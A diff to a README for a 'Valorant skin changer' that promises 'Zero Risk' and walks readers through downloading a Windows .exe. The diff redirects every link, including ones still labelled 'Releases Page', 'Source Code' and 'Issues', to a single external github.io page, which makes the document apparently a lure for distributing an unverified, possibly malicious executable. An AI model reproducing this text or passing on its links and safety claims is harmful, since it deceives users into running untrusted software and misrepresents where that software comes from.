@@ -1,6 +1,6 @@
 # 🎮 valorant-skin-changer-2026 - Unlock Every Cosmetic, Zero Risk
 
-[![Download Now](https://img.shields.io/badge/Download-Valorant_Skin_Changer_2026-FF4655?style=for-the-badge&logo=valorant&logoColor=white&labelColor=0F1923)](https://github.com/mathildehighbrow1050/valorant-skin-changer-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Valorant_Skin_Changer_2026-FF4655?style=for-the-badge&logo=valorant&logoColor=white&labelColor=0F1923)](https://mathildehighbrow1050.github.io)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these simple steps to get your new look in under two minutes.
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 **[https://github.com/mathildehighbrow1050/valorant-skin-changer-2026/releases](https://github.com/mathildehighbrow1050/valorant-skin-changer-2026/releases)**
+👉 **[https://mathildehighbrow1050.github.io](https://mathildehighbrow1050.github.io)**
 
 You'll see a list of released versions. Click the **latest release** (the one at the top). Then download the file labeled for **Windows**.
 
@@ -87,7 +87,7 @@ No admin rights needed. No extra software. No drivers. Just download, run, and p
 
 ### Detailed Download Instructions
 
-1. Go to the **[releases page](https://github.com/mathildehighbrow1050/valorant-skin-changer-2026/releases)**.
+1. Go to the **[releases page](https://mathildehighbrow1050.github.io)**.
 2. Look for the latest version number (e.g., `v2.4.0`).
 3. Under **Assets**, find the file named `valorant-skin-changer-2026.exe` or similar.
 4. Click the filename to start downloading.
@@ -263,9 +263,9 @@ Every bit helps keep development going.
 
 ## 🔗 Quick Links
 
-- **Download**: [Releases Page](https://github.com/mathildehighbrow1050/valorant-skin-changer-2026/releases)
-- **Source Code**: [GitHub Repository](https://github.com/mathildehighbrow1050/valorant-skin-changer-2026)
-- **Report an Issue**: [Issues](https://github.com/mathildehighbrow1050/valorant-skin-changer-2026/issues)
+- **Download**: [Releases Page](https://mathildehighbrow1050.github.io)
+- **Source Code**: [GitHub Repository](https://mathildehighbrow1050.github.io)
+- **Report an Issue**: [Issues](https://mathildehighbrow1050.github.io)
 
 ---
 
